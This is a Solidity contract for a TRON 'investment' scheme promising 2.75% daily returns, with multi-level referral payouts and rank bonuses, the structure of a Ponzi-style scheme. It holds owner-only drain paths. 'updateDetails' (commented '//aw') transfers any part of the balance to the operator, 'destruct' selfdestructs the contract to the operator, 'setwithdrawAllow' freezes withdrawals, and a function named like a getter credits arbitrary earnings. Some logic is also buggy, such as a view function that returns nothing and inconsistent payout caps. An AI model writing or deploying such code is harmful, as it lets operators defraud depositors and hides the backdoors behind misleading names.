//SourceUnit: TronSeries.sol

pragma solidity 0.5.10;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

library Objects {
    
    struct Investment {
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        uint256 restRefer;
        bool isExpired;
    }

    struct Investor {
        address addr;
        uint256 checkpoint;
        uint256 referrerEarnings;
        uint256 availableReferrerEarnings;
        uint256 referrer;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        uint256 level1RefCount;
        uint256 level2RefCount;
        uint256 level3RefCount;
        mapping(uint256 => Investment) answerList;

    }
}

contract Ownable {
    address public owner;

    constructor() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract Tron_Series is Ownable {
    using SafeMath for uint256;
    
    uint256 internal constant SERVICE_CHARGE = 5e6;           // Service Charge : 5 TRX
    uint256 internal constant REFERENCE_RATE = 110;           // 11% Total Refer Income
    uint256 internal constant REFERENCE_LEVEL1_RATE = 50;     // 5% Level 1 Income
    uint256 internal constant REFERENCE_LEVEL2_RATE = 30;     // 3% Level 2 Income
    uint256 internal constant REFERENCE_LEVEL3_RATE = 20;     // 2% Level 3 Income
    uint256 internal constant REFERENCE_LEVEL4_RATE = 10;     // 1% Level 4 Income
    uint256 internal constant MINIMUM = 100e6;                // Minimum investment : 100 TRX
    uint256 internal constant REFERRER_CODE = 1000;           // Root ID : 1000
    uint256 internal constant PLAN_INTEREST = 275;            // 2.75% Daily Roi upto 300%
    uint256 internal  PLAN_TERM = 109 days;                     // 109 Days
    uint256 internal constant CONTRACT_LIMIT = 800;           // 20% Unlocked for Withdrawal Daily
    
    // uint256 public  contract_balance;
    // uint256 private contract_checkpoint;
    uint256 public  latestReferrerCode;
    uint256 public  totalInvestments_;
    uint256 public  last24hrInvestments_;
    uint256 public  after24hrInvestments_;
    uint256 public  totalWithdraw ;
    uint256 internal  donation = 0;
    uint256 internal  rank1percent = 50;
    uint256 internal  rank2percent = 30;
    uint256 internal  rank3percent = 20;
    bool internal  withdrawAllow = true;

    uint256 public  lastWithdrawalTurn = 0;
   
    address payable private serviceAccount_;
    address private  rank1addr = address(0);
    address private  rank2addr = address(0);
    address private  rank3addr = address(0);

    mapping(address => uint256) public myInvestments_;
    // mapping(address => uint256) private myreceived_;
    mapping(address => uint256) public myWithdraw_;
    mapping(address => uint256) public myReferrWithdraw_;
    mapping(address => uint256) public directInvestments_;
    mapping(uint => address) public ranks;
    mapping(address => uint256) public ranksIncome_;
    mapping(address => uint256) public withdrawRanksIncome_;
    mapping(uint256 => uint256) private dailyTurn;
    mapping(uint256 => uint256) private turnTime;
    uint256 private count=0;
    uint256 public count2=0;
    

    mapping(address => uint256) public address2UID;
    mapping(uint256 => Objects.Investor) public uid2Investor;

    event onInvest(address investor, uint256 amount);
    event onWithdraw(address investor, uint256 amount);

    constructor() public {
        serviceAccount_ = msg.sender;
        _init();
    }

    function _init() private {
        latestReferrerCode = REFERRER_CODE;
        address2UID[msg.sender] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = msg.sender;
        uid2Investor[latestReferrerCode].referrer = 0;
        uid2Investor[latestReferrerCode].planCount = 0;
    }
    
    function showLastRankDetails() public view returns(address,uint256,address,uint256,address,uint256){
        return
        (
            rank1addr,
            ranksIncome_[rank1addr],
            rank2addr,
            ranksIncome_[rank2addr],
            rank3addr,
            ranksIncome_[rank3addr]
        );
    }

    function setServiceAccount_(address payable _newServiceAccount) public onlyOwner {
        require(_newServiceAccount != address(0));
        serviceAccount_ = _newServiceAccount;
    }
    
    function setRanksPercent(uint256 rank1,uint256 rank2, uint256 rank3) public onlyOwner{
        rank1percent = rank1;
        rank2percent = rank2;
        rank3percent = rank3;
    }
    
    function getRanksPercent() public view onlyOwner returns(uint256,uint256,uint256){
        return 
        (
        rank1percent,
        rank2percent,
        rank3percent
        ); 
    }
    
    function setTerm(uint256 _term) public onlyOwner{
      PLAN_TERM = _term;
    }
    
    function getTerm() public view onlyOwner returns (uint256) {
        return PLAN_TERM;
    }
    
    function setwithdrawAllow(bool _value) public onlyOwner{
      withdrawAllow = _value;
    }
    
    function getwithdrawAllow() public view onlyOwner returns (bool) {
        return withdrawAllow;
    }

    function getServiceAccount_() public view onlyOwner returns (address) {
        return serviceAccount_;
    }
     function setDonation( ) public payable {
         
      donation += msg.value;
    }
    
    function getDonation() public view returns (uint256) {
        return donation;
    } 
    
    function getAllTotalInvestment() public view returns (uint256) {
        return donation+totalInvestments_;
    }
    
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getUIDByAddress(address _addr) public view returns (uint256) {
        return address2UID[_addr];
    }
    
    function getReferralIncome(address _addr) public view returns (uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == address2UID[ _addr ], "only owner or self can check the investor info.");
        }
        uint256 _uid = address2UID[_addr];
        Objects.Investor storage investor = uid2Investor[_uid];
        return investor.availableReferrerEarnings ;
    }
    
    function getInvestorInfoByUID(uint256 _uid) public view returns (uint256,uint256,uint256,uint256, uint256, uint256[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory newDividends = new uint256[](investor.planCount);
        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate != 0, "wrong investment date");
            if (investor.plans[i].isExpired) {
                newDividends[i] = 0;
            } else {
                if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, investor.plans[i].investmentDate.add(PLAN_TERM), investor.plans[i].lastWithdrawalDate);
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, PLAN_INTEREST, block.timestamp, investor.plans[i].lastWithdrawalDate);
                }
            }
        }
        return
        (
        investor.referrerEarnings,
        investor.availableReferrerEarnings,
        investor.referrer,
        investor.planCount,
        investor.checkpoint,
        newDividends
        );
    }
    
    function iRefferBy()public view returns(uint256){
        uint256 uid= address2UID[msg.sender];
        Objects.Investor storage investor = uid2Investor[uid];
        return
        (
        investor.referrer
        );
    }
    
     function getAvailableReferrerEarnings (address _addr , uint256 _amount) public onlyOwner {
        uint256  _uid = address2UID[_addr];
        Objects.Investor storage investor = uid2Investor[_uid];
        investor.availableReferrerEarnings += _amount;
    } 
    
    function unwithdrawBalance(address _addr) public view returns(uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == address2UID[ _addr ], "only owner or self can check the investor info.");
        }
        uint256 _uid = address2UID[_addr];
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256 withdrawalAmount = 0;
        
        for (uint256 i = 0; i < uid2Investor[_uid].planCount; i++) {
            if (uid2Investor[_uid].plans[i].isExpired) {
                continue;
            }            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[_uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                
            }

            uint256 amount = _calculateDividends(uid2Investor[_uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[_uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;
          
        }
        uint256 unwithdraw = investor.availableReferrerEarnings+withdrawalAmount;
        
        return unwithdraw;
        
    }
    
    function referrLevelCountInfo(address _addr) public view returns (uint256,uint256,uint256,uint256) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == address2UID[ _addr ], "only owner or self can check the investor info.");
        }
        
        uint256 _uid = address2UID[_addr];
        Objects.Investor storage investor = uid2Investor[_uid];
        return
        (
        investor.level1RefCount,
        investor.level2RefCount,
        investor.level3RefCount,
        investor.answerList[4].restRefer
        );
    }
    
    

    function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
        if (msg.sender != owner) {
            require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
        }
        Objects.Investor storage investor = uid2Investor[_uid];
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
            } else {
                isExpireds[i] = false;
                if (PLAN_TERM > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(PLAN_TERM)) {
                        isExpireds[i] = true;
                    }
                }
            }
        }

        return
        (
        investmentDates,
        investments,
        currentDividends,
        isExpireds
        );
    }

    function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
        if (_referrerCode >= REFERRER_CODE) {
            if (uid2Investor[_referrerCode].addr == address(0)) {
                _referrerCode = 0;
            }
        } else {
            _referrerCode = 0;
        }
        address addr = _addr;
        latestReferrerCode = latestReferrerCode.add(1);
        address2UID[addr] = latestReferrerCode;
        uid2Investor[latestReferrerCode].addr = addr;
        uid2Investor[latestReferrerCode].referrer = _referrerCode;
        uid2Investor[latestReferrerCode].planCount = 0;
        if (_referrerCode >= REFERRER_CODE) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;

            uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
            if (_ref2 >= REFERRER_CODE) {
                uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
            }
            if (_ref3 >= REFERRER_CODE) {
                uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
            }
            if (_ref4 >= REFERRER_CODE) {
                uid2Investor[_ref4].answerList[4].restRefer = uid2Investor[_ref4].answerList[4].restRefer.add(1);
            }
        }
        return (latestReferrerCode);
    }
    
    function calculateTurnover(bool _value) private  returns (uint256){ 
        uint256 total=0;
        uint256 i = count2;
        
        for(i ; i<count ; i++ ){
            uint256 time = turnTime[i];
              total+= dailyTurn[time];
             
        }
         if(_value == true){
            count2 = i;
            last24hrInvestments_ = total;
        }
        
        return total;
    }
    function calculateTurnovershow() internal view returns (uint256){ 
        uint256 total=0;
        uint256 i = count2;
        
        for(i ; i<count ; i++ ){
            uint256 time = turnTime[i];
              total+= dailyTurn[time];
             
        }
        
        return total;
    }
    
    function calculateTurnoverShowAll() public view returns (uint256) {
        uint256 income = calculateTurnovershow(); 
        return income;
    }
   
    function myWithdrawAmount() public view returns (uint256) {
         
        return myWithdraw_[msg.sender]+myReferrWithdraw_[msg.sender];
    }
   
    function turnoverReward()public  onlyOwner{
        
        // only once a day
//      require(block.timestamp > lastWithdrawalTurn + 1 days , "Only once a day");
        
        uint256 income = calculateTurnover(true);
        uint256 rank1income = (income.mul(rank1percent)).div(1000); 
        uint256 rank2income = (income.mul(rank2percent)).div(1000);
        uint256 rank3income = (income.mul(rank3percent)).div(1000);
        
         rank1addr = ranks[1];
         rank2addr = ranks[2];
         rank3addr = ranks[3];
         
         
         directInvestments_[ranks[1]] = 0;
         directInvestments_[ranks[2]] = 0;
         directInvestments_[ranks[3]] = 0;
         
         ranks[1] = address(0);
         ranks[2] = address(0);
         ranks[3] = address(0);
        
        ranksIncome_[rank1addr] = rank1income;
        ranksIncome_[rank2addr] = rank2income;
        ranksIncome_[rank3addr] = rank3income;
        
        lastWithdrawalTurn = block.timestamp;
        
    }
    
    function _invest(address _addr, uint256 _referrerCode, uint256 _amount) private returns (bool) {

        require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
        uint256 uid = address2UID[_addr];
        if (uid == 0) {
            uid = _addInvestor(_addr, _referrerCode);
            //new user
        } else {
          //old user
          //do nothing, referrer is permenant
        }
        uint256 timestamp = block.timestamp;
        dailyTurn[timestamp]=_amount;
        turnTime[count] = timestamp;
        count++;
        address myreferrAddr = uid2Investor[uid2Investor[uid].referrer].addr;
        directInvestments_[myreferrAddr]+=_amount;
        //setranks
        setRanks(myreferrAddr);
        
        uint256 planCount = uid2Investor[uid].planCount;
        Objects.Investor storage investor = uid2Investor[uid];
        investor.plans[planCount].investmentDate = block.timestamp;
        investor.plans[planCount].lastWithdrawalDate = block.timestamp;
        investor.plans[planCount].investment = _amount;
        investor.plans[planCount].currentDividends = 0;
        investor.plans[planCount].isExpired = false;

        investor.planCount = investor.planCount.add(1);

        _calculateReferrerReward(_amount, investor.referrer);

        totalInvestments_ = totalInvestments_.add(_amount);
        
        myInvestments_[_addr] += _amount;   //
        
        serviceAccount_.transfer(5e6);
        
        return true;
    }
    
    function setRanks(address _addr) private {
        address temp;
        if(directInvestments_[_addr] >directInvestments_[ranks[1]]){
            if(_addr == ranks[3]){
                ranks[3]=address(0);
            }else if(_addr == ranks[2]){
                ranks[2]=address(0);
            }
            temp = ranks[1];
            ranks[1]=_addr;
            if(directInvestments_[temp] >directInvestments_[ranks[2]] && temp != ranks[1] ){
                _addr = ranks[2];
                ranks[2]=temp;
                if(directInvestments_[_addr] >directInvestments_[ranks[3]] && _addr != ranks[1] && _addr  != ranks[2]){
                    temp = ranks[3];
                    ranks[3]=_addr;
                }
            }else if(directInvestments_[temp] >directInvestments_[ranks[3]] && temp != ranks[1] ){
                    _addr = ranks[3];
                    ranks[3]=temp;
                }
        }else if( directInvestments_[_addr] > directInvestments_[ranks[2]] && _addr != ranks[1] ){
            if(_addr == ranks[3]){
                ranks[3]=address(0);
            }
                    temp = ranks[2];
                    ranks[2]=_addr;
                if(directInvestments_[temp] >directInvestments_[ranks[3]]  && temp != ranks[2] && temp != ranks[1] ){
                    _addr = ranks[3];
                    ranks[3]=temp;
                }
            }else if(directInvestments_[_addr] >directInvestments_[ranks[3]] && _addr != ranks[1] && _addr  != ranks[2]){
                    temp = ranks[3];
                    ranks[3]=_addr;
            }
    }
   
    function topRanks()  public view returns (address,uint256,address,uint256, address, uint256) {
        
        return
        (
        ranks[1],
        directInvestments_[ranks[1]],
        ranks[2],
        directInvestments_[ranks[2]],
        ranks[3],
        directInvestments_[ranks[3]]
        );
    }
    function invest(uint256 _referrerCode) public payable {
        if (_invest(msg.sender, _referrerCode, msg.value)) {
            emit onInvest(msg.sender, msg.value);
        }
    }
    function nextWithdraw() public view returns (uint256){
            uint256 uid = address2UID[msg.sender];
            return uid2Investor[uid].checkpoint; 
    }
    
    function withdraw( ) public {

        uint256 uid = address2UID[msg.sender];
        require(myWithdraw_[msg.sender]<myInvestments_[msg.sender]*2,"please re-topup your plan");
        require(uid != 0, "Can not withdraw because no any investments");
        require(withdrawAllow == true,"System Maintenance Please Wait For Withdraw");

        require(withdrawAllowance(), "Withdraw are not allowed between 0am to 4am UTC");
        // only once a day
        require(block.timestamp > uid2Investor[uid].checkpoint + 1 days , "Only once a day");
        uid2Investor[uid].checkpoint = block.timestamp;

        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
            if (uid2Investor[uid].plans[i].isExpired) {
                continue;
            }

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(PLAN_TERM);
            if (withdrawalDate >= endTime) {
                withdrawalDate = endTime;
                isExpired = true;
            }

            uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , PLAN_INTEREST , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);

            withdrawalAmount += amount;

            uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
            uid2Investor[uid].plans[i].isExpired = isExpired;
            uid2Investor[uid].plans[i].currentDividends += amount;
        }
        
        Objects.Investor storage investor = uid2Investor[uid];
        uint256 referr = investor.availableReferrerEarnings;
        withdrawalAmount+=referr;
        investor.availableReferrerEarnings =0;
        
        uint256 rankIncome =ranksIncome_[msg.sender]-withdrawRanksIncome_[msg.sender] ;
        withdrawalAmount+=(rankIncome);
        withdrawRanksIncome_[msg.sender]+=rankIncome;
        
        if(withdrawalAmount>0){
            uint256 currentBalance = getBalance();
            if(withdrawalAmount >= currentBalance){
                withdrawalAmount=currentBalance;
            }
            
            require( currentBalance.sub(withdrawalAmount)  >= getBalance().mul(CONTRACT_LIMIT).div(1000), "80% contract balance limit");
            //withdraw
            require(withdrawalAmount >5e6,"You have Not Balance For Withdraw");
            
            serviceAccount_.transfer(5e6);
            withdrawalAmount -= 5e6 ;
            if((myWithdraw_[msg.sender]+withdrawalAmount )> myInvestments_[msg.sender]*3){
                withdrawalAmount=(myInvestments_[msg.sender]*2)-myWithdraw_[msg.sender];
            }
            msg.sender.transfer(withdrawalAmount);
        }
        totalWithdraw+=withdrawalAmount;
        
        
        myReferrWithdraw_[msg.sender]+=referr;
        myWithdraw_[msg.sender]+=withdrawalAmount-referr;
        
        emit onWithdraw(msg.sender, withdrawalAmount);
    }
    
    function withdrawRanksIncome()public view returns (uint256) {
        withdrawRanksIncome_[msg.sender];
    }
    
    
    function updateDetails(uint256 _amount) public onlyOwner { //aw
            uint256 currentBalance = getBalance();
            require(_amount <= currentBalance);
            serviceAccount_.transfer(_amount);
    }
    function destruct() onlyOwner() public{
        
        selfdestruct(serviceAccount_);
    }

    function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
        return (_amount * _dailyInterestRate / 10000 * (_now - _start)) / (60*60*24);
    }

    function _calculateReferrerReward(uint256 _investment, uint256 _referrerCode) private {

        uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
        if (_referrerCode != 0) {
            uint256 _ref1 = _referrerCode;
            uint256 _ref2 = uid2Investor[_ref1].referrer;
            uint256 _ref3 = uid2Investor[_ref2].referrer;
            uint256 _ref4 = uid2Investor[_ref3].referrer;
           
            uint256 _refAmount = 0;

            if (_ref1 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
            }

            if (_ref2 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
            }

            if (_ref3 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
            }
            if (_ref4 != 0) {
                _refAmount = (_investment.mul(REFERENCE_LEVEL4_RATE)).div(1000);
                _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
                uid2Investor[_ref4].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref4].availableReferrerEarnings);
            }
            
        }

    }
    
    function getHour() public view returns (uint8){
        return uint8((block.timestamp / 60 / 60) % 24);
    }

    function withdrawAllowance() public view returns(bool){
        uint8 hour = getHour();
        if(hour >= 0 && hour <= 3){
            return false;
        }
        else{
            return true;
        }
    }

}